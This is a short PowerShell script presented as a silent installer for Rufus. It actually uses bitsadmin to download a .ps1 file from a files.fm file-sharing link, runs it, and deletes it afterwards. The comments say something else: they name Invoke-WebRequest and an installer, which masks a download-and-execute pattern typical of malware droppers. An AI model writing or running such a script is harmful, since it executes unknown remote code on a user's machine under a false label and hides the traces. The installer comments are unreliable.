# Set the download URL and output file path
$outputFile = 'C:\test.ps1'

# Download the installer using Invoke-WebRequest
bitsadmin.exe /transfer "macn2" https://files.fm/u/gmxuke98s C:\test.ps1

# Install the application silently (this may vary depending on the application)
# For Rufus, we'll use the /S flag for silent installation
Start-Process -FilePath $outputFile -ArgumentList '/S' -Wait

# Once the installation is complete, you can add any additional post-installation tasks here.
# For example, you might want to delete the downloaded installer after installation:

# Remove the downloaded installer (optional)
Remove-Item $outputFile
